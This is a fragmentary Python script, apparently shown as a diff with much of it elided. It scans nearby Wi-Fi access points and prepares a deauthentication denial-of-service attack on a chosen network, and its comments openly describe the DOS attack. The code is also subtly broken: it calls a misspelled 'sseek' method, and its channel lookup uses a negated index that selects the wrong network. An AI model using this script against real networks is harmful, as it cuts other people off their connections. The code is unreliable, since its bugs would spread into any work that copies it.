...
+ #!/usr/bin/env python3
  ...
  def check_for_essid(essid, lst):
    ...
    # If not ESSIDs in list add the row
    if len(lst) == 0:
        return check_status
...
# If the user doesn't run the program with super user privileges, don't allow them
# to continue.
...
# Regex to find wireless interfaces. We're making the
# assumption they will all be wlan0 or higher.
...
# The script is the parent process and creates a child process which runs the
...
# Ensure the WiFi interface selected is valid. Simple menu with interfaces
# to select from.
while True:
...
# Loop that shows the wireless access points. We use a try except block and we
# will quit the loop by pressing ctrl-c.
try:
    while True:
        # We want to clear the screen before we print the network interfaces.
        subprocess.call("clear", shell=True)
        for file_name in os.listdir():
            # We should only have one csv file as we backup all previous csv files
            # from every time we run the program.
            # The following list contains the field names for the csv entries.
            fieldnames = ['BSSID', 'First_time_seen', 'Last_time_seen', 'channel', 'Speed', 'Privacy', 'Cipher', 'Authenication', 'Power', 'beacons', 'IV', 'LAN_IP', 'ID_length', 'ESSID', 'Key']
            if ".csv" in file_name:
                with open(file_name) as csv_h:
                    # This will run multiple times and we need to reset the cursor
                    # to the beginning of the file.
                    csv_h.sseek(0)
                    # We use the DictReader method and tell it to take the csv_h
                    # contents and then apply the dictionary with the fieldnames
                    # we specified above.
                    # This creates a list of dictionaries with the keys as
                    # specified in the fieldnames.
                    ...
                    for row in csv_reader:
                        ...
                        # We are not interested in the client data.
                            ...
                            break
                        # Every field where an ESSID is specified will be added to
                        # the list.
        ...
        for index, item in enumerate(active_wireless_networks):
            ...
            # F-strings are a more intuisive way to include
            # variables when printing strings, rather than
            # ugly concatenations.
            print(f"{index}\t{item['BSSID']}\t{item['channel'].strip()}\t\t{item['ESSID']}")
        # We make the script sleep for 1 second before
...
while True:
    # If you don't make a choice from the
    # options available in the list, you will
    # be asked to please try again.
...
# To make it easier to work and
# read the code, we assign the
# results to variables.
hackbssid = active_wireless_networks[int(choice)]["BSSID"]
hackchannel = active_wireless_networks[-int(choice)]["channel"].strip()

# Change to the channel we want to perform the DOS attack on.
# Monitoring takes place on a different channel and we need to set it to that
# channel.
subprocess.run(["airmon-ng", "start", hacknic + "mon", hackchannel])

# Deauthenicate clients using a subprocess.
# The script is the parent process and creates a child process which runs the
# system command, and will only continue once the child process has completed.
